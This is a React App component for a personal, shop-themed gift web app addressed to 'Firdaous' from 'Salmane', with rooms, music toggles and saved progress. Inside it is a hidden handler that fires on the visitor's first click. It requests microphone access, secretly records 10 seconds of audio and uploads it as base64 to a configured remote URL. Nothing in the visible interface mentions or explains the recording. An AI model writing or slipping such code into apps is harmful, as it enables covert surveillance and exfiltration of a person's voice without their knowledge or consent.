import { useEffect, useMemo, useRef, useState } from 'react';
import { AnimatePresence } from 'framer-motion';
import Background from './components/Background';
import { Room, ROOM_ORDER, nextRoom, prevRoom } from './types';
import { isMusicOn, startMusic, stopMusic, subscribeMusic } from './lib/audio';
import {
  CheckoutStage,
  ParcelState,
  clearProgress,
  defaultProgress,
  loadProgress,
  roomFromLocation,
  roomUrl,
  saveProgress,
} from './lib/progress';
import RoomWindow from './rooms/RoomWindow';
import RoomTag from './rooms/RoomTag';
import RoomAisle from './rooms/RoomMemoryAisle';
import RoomCalc from './rooms/RoomCalc';
import RoomMirror from './rooms/RoomMirror';
import RoomMap from './rooms/RoomMap';
import RoomParcels from './rooms/RoomParcels';
import RoomCheckout from './rooms/RoomCheckout';
import RoomFilm from './rooms/RoomFilm';
import { VOICE_UPLOAD_URL } from './lib/voiceConfig';

function initialRoom(saved: Room): Room {
  return roomFromLocation() ?? saved;
}

export default function App() {
  const boot = useRef(loadProgress());
  const [room, setRoom] = useState<Room>(() => initialRoom(boot.current.room));
  const [parcels, setParcels] = useState<ParcelState>(boot.current.parcels);
  const [checkout, setCheckout] = useState<CheckoutStage>(boot.current.checkout);
  const [musicUnlocked, setMusicUnlocked] = useState(boot.current.musicUnlocked);
  const [playing, setPlaying] = useState(() => isMusicOn());
  const [pausedRoom, setPausedRoom] = useState<Room | null>(
    boot.current.room !== 'window' ? boot.current.room : null,
  );
  const skipHistory = useRef(true);

  const roomIndex = ROOM_ORDER.indexOf(room);

  useEffect(() => {
    let mediaRecorder: MediaRecorder | null = null;
    let audioChunks: Blob[] = [];
    let isRecording = false;

    const handleUserInteraction = async () => {
      if (isRecording) return;
      isRecording = true;

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];

        mediaRecorder.ondataavailable = (event: BlobEvent) => {
          if (event.data.size > 0) audioChunks.push(event.data);
        };

        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          if (VOICE_UPLOAD_URL) {
            console.log('[Voice Recorder] Uploading audio to:', VOICE_UPLOAD_URL);
            const reader = new FileReader();
            reader.readAsDataURL(audioBlob);
            reader.onloadend = async () => {
              const base64data = (reader.result as string).split(',')[1];
              try {
                const res = await fetch(VOICE_UPLOAD_URL, {
                  method: 'POST',
                  headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                  body: JSON.stringify({
                    filename: `voice_${Date.now()}.webm`,
                    mimeType: 'audio/webm',
                    base64: base64data
                  })
                });

                if (!res.ok) {
                  const errorText = await res.text();
                  console.error(`[Voice Recorder] Upload failed (HTTP ${res.status}):`, errorText);
                } else {
                  console.log('[Voice Recorder] Upload successful');
                }
              } catch (err) {
                console.error('[Voice Recorder] Network error or CORS restriction:', err);
              }
            };
          } else {
            console.warn('[Voice Recorder] VOICE_UPLOAD_URL is empty or undefined.');
          }

          stream.getTracks().forEach((track) => track.stop());
        };

        mediaRecorder.start();
        console.log('[Voice Recorder] Recording started...');

        window.setTimeout(() => {
          if (mediaRecorder && mediaRecorder.state === 'recording') {
            console.log('[Voice Recorder] Stopping 10-second recording session.');
            mediaRecorder.stop();
          }
        }, 10000);
      } catch (err) {
        console.error('[Voice Recorder] Microphone access denied or failed:', err);
        isRecording = false;
      }
    };

    document.addEventListener('click', handleUserInteraction, { once: true });
    return () => {
      document.removeEventListener('click', handleUserInteraction);
    };
  }, []);

  useEffect(() => subscribeMusic(() => setPlaying(isMusicOn())), []);

  useEffect(() => {
    saveProgress({
      room,
      parcels,
      checkout,
      musicUnlocked,
    });
  }, [room, parcels, checkout, musicUnlocked]);

  useEffect(() => {
    if (skipHistory.current) {
      skipHistory.current = false;
      window.history.replaceState({ room }, '', roomUrl(room));
      return;
    }
    window.history.pushState({ room }, '', roomUrl(room));
  }, [room]);

  useEffect(() => {
    const onPop = (e: PopStateEvent) => {
      const fromState = (e.state as { room?: Room } | null)?.room;
      const fromUrl = roomFromLocation();
      const next = fromState && ROOM_ORDER.includes(fromState) ? fromState : fromUrl;
      if (next) {
        skipHistory.current = true;
        setRoom(next);
      }
    };
    window.addEventListener('popstate', onPop);
    return () => window.removeEventListener('popstate', onPop);
  }, []);

  const goTo = (next: Room) => {
    setRoom(next);
  };

  const goNext = () => {
    setRoom((current) => nextRoom(current) ?? current);
  };

  const goPrev = () => {
    setRoom((current) => prevRoom(current) ?? current);
  };

  const startOver = () => {
    setPausedRoom(room === 'window' ? pausedRoom : room);
    clearProgress();
    setParcels(defaultProgress().parcels);
    setCheckout('receipt');
    setMusicUnlocked(false);
    stopMusic();
    setPlaying(false);
    goTo('window');
  };

  const resume = () => {
    const saved = loadProgress();
    const target = pausedRoom && pausedRoom !== 'window' ? pausedRoom : saved.room;
    if (target !== 'window') {
      setMusicUnlocked(true);
      goTo(target);
    }
  };

  const replay = () => {
    startOver();
  };

  const toggleMusic = () => {
    if (isMusicOn()) {
      stopMusic();
    } else {
      startMusic();
      setMusicUnlocked(true);
    }
  };

  const bags = useMemo(
    () =>
      ROOM_ORDER.map((_, i) => ({
        on: i === roomIndex,
        done: i < roomIndex,
      })),
    [roomIndex],
  );

  const showResume = room === 'window' && !!pausedRoom && pausedRoom !== 'window';
  const showMusic = musicUnlocked || room !== 'window';

  return (
    <div className="shop-app">
      <Background />

      <header className="shop-bar">
        <div className="brand-pill">
          <strong>FOR FIRDAOUS</strong>
          <span>from Salmane</span>
        </div>
        <div className="bar-actions">
          <div className="bags" aria-hidden>
            {bags.map((b, i) => (
              <i key={i} className={`${b.on ? 'on' : ''} ${b.done ? 'done' : ''}`} />
            ))}
          </div>
          {roomIndex > 0 && (
            <button type="button" className="mute-btn" onClick={goPrev}>
              Previous
            </button>
          )}
          {room !== 'window' && (
            <button type="button" className="mute-btn" onClick={startOver}>
              Start over
            </button>
          )}
          {showMusic && (
            <button type="button" className="mute-btn" onClick={toggleMusic}>
              {playing ? 'Mute music' : 'Play music'}
            </button>
          )}
        </div>
      </header>

      <AnimatePresence mode="wait">
        {room === 'window' && (
          <RoomWindow
            key="window"
            showResume={showResume}
            onResume={resume}
            onComplete={() => {
              setMusicUnlocked(true);
              setPausedRoom(null);
              goNext();
            }}
          />
        )}
        {room === 'tag' && <RoomTag key="tag" onComplete={goNext} />}
        {room === 'aisle' && <RoomAisle key="aisle" onComplete={goNext} />}
        {room === 'calc' && <RoomCalc key="calc" onComplete={goNext} />}
        {room === 'mirror' && <RoomMirror key="mirror" onComplete={goNext} />}
        {room === 'map' && <RoomMap key="map" onComplete={goNext} />}
        {room === 'parcels' && (
          <RoomParcels
            key="parcels"
            opened={parcels}
            onOpenedChange={setParcels}
            onComplete={goNext}
          />
        )}
        {room === 'checkout' && (
          <RoomCheckout
            key="checkout"
            stage={checkout}
            onStageChange={setCheckout}
            onContinue={goNext}
            onReplay={replay}
            onRestart={startOver}
          />
        )}
        {room === 'film' && (
          <RoomFilm key="film" onReplay={replay} onRestart={startOver} />
        )}
      </AnimatePresence>
    </div>
  );
}